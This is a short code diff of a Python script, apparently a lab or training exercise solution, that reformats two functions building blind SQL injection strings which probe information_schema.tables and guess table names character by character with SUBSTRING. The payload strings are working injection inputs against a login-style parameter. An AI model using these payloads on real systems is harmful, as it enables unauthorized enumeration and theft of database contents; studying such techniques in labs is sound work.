@@ -10,13 +10,17 @@ def print_table_names():
 
 
 def check_query(table_name):
-    return f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
-           f'table_name = \'{table_name}\')--'
+    return (
+        f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE '
+        f'table_name = \'{table_name}\')--'
+    )
 
 
 def builder_query(length, word):
-    return f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
-           f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
+    return (
+        f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE '
+        f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
+    )
 
 
 def get_table_names(cookie):
